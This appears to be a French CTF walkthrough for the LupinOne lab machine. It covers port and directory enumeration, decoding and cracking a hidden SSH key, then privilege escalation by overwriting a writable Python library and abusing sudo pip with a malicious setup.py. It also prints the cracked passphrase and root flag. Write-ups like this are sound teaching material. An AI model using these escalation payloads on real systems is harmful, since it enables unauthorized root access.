
## Configuration du machine

![[Pasted image 20260108083034.png]]

Réseau : NAT

Interface web de cette machine :
![[Pasted image 20260108083751.png]]

## ÉTAPE 1 – Scan des ports (Nmap)

```
nmap -sC -sV -A 172.16.171.149
```
![[Pasted image 20260108083431.png]]

## ÉTAPE 2 – Enumération Web (suite logique)

**2.1 Consulter robots.txt (TRÈS IMPORTANT)**
![[Pasted image 20260108084414.png]]

**2.2 Explorer le répertoire caché**
![[Pasted image 20260108084554.png]]
# ÉTAPE 3 – Scan de répertoires ciblé

Comme Apache est actif, on continue :
```
ffuf -u http://172.16.171.149/~FUZZ -w /usr/share/wordlists/dirb/common.txt

```
![[Pasted image 20260108091808.png]]

Oui, j'ai trouvé un autre répertoire nommé `secret`. Jetons un coup d'œil à son contenu.

```
http://172.16.171.149/~secret
```
![[Pasted image 20260108092054.png]]
# Analyse du message `/~secret/`

Contenu clé :

> _“Je l'ai créé pour partager avec toi mon fichier de clé privée SSH”_  
> _“Il est caché quelque part ici”_  
> _“casser ma phrase de passe rapidement”_  
> _Signature : **icex64**_

**Conclusions immédiates :**
1. ✅ Il existe une **clé privée SSH**
2. ✅ Elle est **dans le dossier `~secret`**
3. ✅ Elle est **cachée** (pas visible directement)
4. ✅ Elle a une **passphrase**
5. 👤 **Utilisateur SSH = `icex64`**

👉 Le but maintenant :
- **trouver la clé privée**
- **la déverrouiller**
- **se connecter en SSH**

# ÉTAPE CRITIQUE — Trouver la clé SSH cachée

## 1️⃣ Enumération complète du dossier `~secret`

Lance **IMMÉDIATEMENT** :
```
ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 -c -ic -fc 403 -u http://172.16.171.149/~secret/.FUZZ -e .py,.java,.php,.dart,.rar,.zip,.txt,.html
```
![[Pasted image 20260108101927.png]]

Il existe un fichier nommé `.mysecret.txt`, et il contient un long texte chiffré. Déchiffrons ce texte.
![[Pasted image 20260108102113.png]]

J'ai utilisé ici un identifiant de chiffrement.J'ai constaté que le texte est au format base 58 et, après déchiffrement, il donne une clé privée SSH.

![[Pasted image 20260108102345.png]]
![[Pasted image 20260108102709.png]]

## ÉTAPE 4. Exploitation

Tout d'abord, je vais créer un fichier texte à partir de la clé privée SSH et modifier ses permissions pour que seuls le propriétaire puisse lire et écrire.

```
nano ssh_key.txt  
  
chmod 600 ssh_key.txt
```
Ensuite, je convertirai ce fichier de clé privée SSH en un fichier de hachage en utilisant `ssh2john`.
```
ssh2john ssh_key.txt > key
```
![[Pasted image 20260108105118.png]]

```
cat key
```
![[Pasted image 20260108105256.png]]

Maintenant, essayons de déchiffrer le fichier de hachage à l'aide de John.
```
john --wordlist=/usr/share/wordlists/fasttrack.txt key
```
![[Pasted image 20260108105428.png]]
J'ai obtenu le mot de passe, je peux maintenant essayer de me connecter en tant qu'icex64 via SSH.

```
ssh icex64@172.16.171.149 -i ssh_key.txt  
  
mot de passe : P@55w0rd!
```
![[Pasted image 20260108105833.png]]

## ÉTAPE 5. Élévation des privilèges
```
sudo -l 
```
![[Pasted image 20260108110451.png]]

On peux exécuter `/home/arsene/heist.py` en tant qu'utilisateur `arsene` sans mot de passe !

1. Examiner le script heist.py
```
cat /home/arsene/heist.py
```
![[Pasted image 20260108111101.png]]
2. Vérifier les permissions du fichier
```
ls -la /home/arsene/heist.py
```
![[Pasted image 20260108111142.png]]

**J'ai d'abord vérifié le fichier note.txt**
```
cat note.txt
```
![[Pasted image 20260108113842.png]]

Vient ensuite le fichier heist.py. Il semble que ce script importe la bibliothèque webbrowser.
```
cat heist.py
```
![[Pasted image 20260108114207.png]]

Comme je n'ai pas les droits d'écriture sur le fichier heist.py, je vais vérifier les permissions de la bibliothèque webbrowser.py, qui se trouve dans `/usr/lib/python3.9`
```
ls -la /usr/lib/python3.9 | grep webbrowser.py
```
![[Pasted image 20260108114324.png]]

Bon, puisque j'ai les droits d'écriture sur webbrowser.py, je vais écraser le script à l'aide d'un shell inversé.
```
nano /usr/lib/python3.9/webbrowser.py
```

![[Pasted image 20260108114504.png]]

```
cat > /usr/lib/python3.9/webbrowser.py << 'EOF'
import os
os.system("/bin/bash")

def open(url):
    pass
EOF
```
```
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```
![[Pasted image 20260108123433.png]]

Je suis maintenant passé à l'utilisateur arsene et je peux voir le contenu du fichier .secret.
```
ls -la  
```
![[Pasted image 20260108123715.png]]
```
cat .secret
```
**Vérifier la permission de l'utilisateur  arsene**
```
sudo -l
```
![[Pasted image 20260108124115.png]]

JACKPOT ! Arsene peut exécuter `/usr/bin/pip` en tant que root sans mot de passe !

##### Exploitation de pip pour obtenir root
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```
![[Pasted image 20260108130426.png]]

Et maintenant, je suis connecté en tant que root et j'ai trouvé le drapeau root dans le répertoire racine.
```
cd /root

cat root.txt
```
![[Pasted image 20260108130811.png]]![[Pasted image 20260108131000.png]]

**Root Flag**
```
3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
```
